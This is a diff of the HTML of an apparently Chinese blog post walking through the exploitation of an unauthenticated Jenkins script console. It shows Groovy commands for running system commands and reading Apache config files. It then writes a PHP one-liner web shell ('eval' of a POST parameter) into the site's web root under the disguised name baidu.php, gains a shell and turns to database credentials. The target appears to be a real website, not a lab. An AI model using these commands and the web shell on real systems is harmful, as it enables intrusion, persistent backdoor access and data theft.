@@ -28,7 +28,7 @@
 <meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E&#x2F;11.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E&#x2F;12.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E&#x2F;13.png">
-<meta property="og:updated_time" content="2020-01-21T07:04:41.106Z">
+<meta property="og:updated_time" content="2020-02-10T03:08:24.636Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E&#x2F;1.png">
   
@@ -199,7 +199,9 @@
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/1.png" alt="img"></p>
 <p>在系统管理里 找到脚本命令</p>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/2.png" alt="img"></p>
-<p>println “whoami”.execute().text</p>
+<ul>
+<li>println “whoami”.execute().text</li>
+</ul>
 <p>执行命令</p>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/3.png" alt="img"></p>
 <p>ping dnslog 无连接 该服务器无法出网且没有web 遂放弃</p>
@@ -210,22 +212,32 @@
 <p>数据已经过来可以出网</p>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/6.png" alt="img"></p>
 <p>查找web路径</p>
-<p>println “httpd -V”.execute().text</p>
+<ul>
+<li>println “httpd -V”.execute().text</li>
+</ul>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/7.png" alt="img"></p>
 <p>查看配置文件</p>
-<p>println “cat /www/server/apache/conf/httpd.conf”.execute().text</p>
+<ul>
+<li>println “cat /www/server/apache/conf/httpd.conf”.execute().text</li>
+</ul>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/8.png" alt="img"></p>
-<p>ls -l /www/server/apache/bin</p>
-<p>/www/wwwroot/faka/faka/</p>
+<ul>
+<li>ls -l /www/server/apache/bin</li>
+</ul>
+<p>找到网站目录 /www/wwwroot/faka/faka/</p>
 <p>确认网站目录</p>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/9.png" alt="img"></p>
-<p>new File (“/www/wwwroot/faka/faka/1.php”).write(‘<?php phpinfo(); ?>‘);</p>
+<p><code>new File (&quot;/www/wwwroot/faka/faka/1.php&quot;).write(&#39;&lt;?php phpinfo(); ?&gt;&#39;);</code></p>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/10.png" alt="img"></p>
 <p>写入1.php成功</p>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/11.png" alt="img"></p>
-<p>现在写入菜刀一句话<?php @eval($_POST['pass']) ?></p>
+<ul>
+<li>现在写入菜刀一句话<?php @eval($_POST['pass']) ?></li>
+</ul>
 <p>一句话一定转译单引号</p>
-<p>new File (“/www/wwwroot/xxx/xxx/baidu.php”).write(‘<?php @eval($_POST[\'pass\']) ?>‘);</p>
+<ul>
+<li>new File (“/www/wwwroot/xxx/xxx/baidu.php”).write(‘<?php @eval($_POST[\'pass\']) ?>‘);</li>
+</ul>
 <p>拿到shell</p>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/12.png" alt="img"></p>
 <p>从配置文件找到数据库</p>
